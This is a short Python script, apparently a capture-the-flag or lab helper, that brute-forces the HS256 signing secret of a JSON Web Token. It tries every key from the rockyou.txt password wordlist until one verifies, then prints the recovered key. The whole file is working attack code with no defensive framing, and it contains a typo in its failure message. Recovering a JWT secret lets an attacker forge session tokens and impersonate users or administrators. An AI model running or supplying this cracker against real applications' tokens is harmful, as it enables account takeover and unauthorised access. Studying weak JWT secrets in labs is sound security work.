import jwt
import os

GUEST_TOKEN = "LOGGED_IN_TOKEN" 

def crack_secret_key(token, wordlist_path=None):
    print(f"Attempting to crack JWT secret...")
    
    candidates = []
    
    if wordlist_path and os.path.exists(wordlist_path):
        print(f"Loading wordlist: {wordlist_path}")
        try:
            with open(wordlist_path, 'r', encoding='latin-1') as f:
                candidates.extend([line.strip() for line in f])
        except Exception as e:
            print(f"Error reading wordlist: {e}")

    candidates = list(set(candidates))

    for key in candidates:
        try:
            jwt.decode(token, key, algorithms=["HS256"])
            print(f"\n[+] SUCCESS! Secret Key Found: '{key}'")
            return key
        except jwt.InvalidTokenError:
            continue
            
    print("\nailed to crack secret key with provided list.")
    return None

crack_secret_key(GUEST_TOKEN, '/Users/jameskaois69/Downloads/rockyou.txt')